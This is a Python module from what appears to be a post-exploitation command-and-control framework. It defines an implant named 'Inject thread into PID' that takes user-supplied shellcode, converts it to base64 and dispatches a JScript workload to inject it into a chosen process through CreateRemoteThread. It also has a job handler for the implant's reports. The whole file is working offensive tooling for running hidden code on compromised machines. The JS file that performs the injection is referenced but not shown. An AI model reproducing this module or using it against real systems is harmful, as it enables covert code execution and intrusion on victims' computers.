import core.implant
import core.job

class SDotNetInjectJob(core.job.Job):
    def create(self):
        self.errstat = 0

    def report(self, handler, data, sanitize = False):
        data = data.decode('latin-1')

        if len(data) == 0:
            handler.reply(200)
            return

        if data == "Done" and self.errstat != 1:
            super(SDotNetInjectJob, self).report(handler, data)

        handler.reply(200)

    def done(self):
        self.results = "Complete"
        self.display()

    def display(self):
        try:
            self.print_good(self.data)
        except:
            pass

class SDotNetInjectImplant(core.implant.Implant):

    NAME = "Inject thread into PID"
    DESCRIPTION = "Injects shellcode into a host process via createremotethread as a new thread."
    AUTHORS = ["psmitty"]
    STATE = "implant/inject/shellcode_inject_thread"

    def load(self):
        self.options.register("BITS", "32", "Bittage of host process.", required=True)
        self.options.register("SC_HEX", "", "Shellcode hex, or file containing shell code in hex.", required=True)
        self.options.register("SC_B64", "", "Shellcode in base64.", advanced=True)
        self.options.register("PID", "", "PID of injectable process.", required=True)

    def job(self):
        return SDotNetInjectJob

    def tob64(self, path):
        import base64
        import os.path
        import binascii

        if os.path.isfile(path):
            with open(path, 'r') as fileobj:
                text = base64.b64encode(binascii.unhexlify(fileobj.read())).decode()
        else:
            text = base64.b64encode(binascii.unhexlify(path)).decode()

        index = 0
        ret = '"';
        for c in text:
            ret += str(c)
            index += 1
            if index % 100 == 0:
                ret += '"+\r\n"'

        ret += '";'
        return ret

    def run(self):
        self.options.set("SC_B64", self.tob64(self.options.get("SC_HEX")))

        workloads = {}
        workloads["js"] = self.loader.load_script("data/implant/inject/shellcode_inject_thread.js", self.options)

        self.dispatch(workloads, self.job)
